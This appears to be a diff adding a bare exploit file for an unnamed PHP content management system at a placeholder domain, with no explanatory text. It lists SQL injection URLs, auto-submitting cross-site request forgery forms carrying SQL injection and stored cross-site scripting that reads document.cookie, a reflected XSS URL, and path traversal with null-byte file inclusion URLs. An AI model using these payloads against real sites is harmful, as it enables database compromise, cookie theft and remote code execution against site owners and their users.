@@ -1,0 +1,47 @@
+http://www.example.com/www/index.php?admin=1&section=content&action=edit&id=PAGE_ID'+ANY_SQL
+http://www.example.com/www/index.php?template=home&content=home'+ANY_SQL
+http://www.example.com/www/index.php?template=forum&action=showReplies&index=1'+ANY_SQL_CODE
+http://www.example.com/www/index.php?template=blog&id=1'+ANY_SQL_CODE
+
+&lt;form action=&quot;http://www.example.com/www/index.php&quot; method=&quot;post&quot; name=&quot;main&quot; &gt;
+
+&lt;input type=&quot;hidden&quot; name=&quot;template&quot; value=&quot;3&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;language&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;name&quot; value=&quot;home&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;note&quot; value='The note text' /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;value&quot; value=&quot;page content&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;admin&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;text&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;section&quot; value=&quot;content&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;9'+ANY_SQL_CODE&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;Save text&quot; /&gt;
+
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
+
+
+&lt;form action=&quot;http://www.example.com/www/index.php&quot; method=&quot;post&quot; name=&quot;main&quot; &gt;
+
+&lt;input type=&quot;hidden&quot; name=&quot;template&quot; value=&quot;3&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;language&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;name&quot; value=&quot;home&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;note&quot; value='The note text&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;' /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;value&quot; value=&quot;page content&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;admin&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;text&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;section&quot; value=&quot;content&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;9&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;Save text&quot; /&gt;
+
+http://www.example.com/www/index.php?admin=1&section=language&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&action=addLanguage
+
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
+
+http://www.example.com/www/index.php?template=./../../../../../../../tmp/test.php%00
+
+http://www.example.com/www/index.php?admin=1&section=style&action=editStylesheet&name=./../../../../../../../tmp/test.php
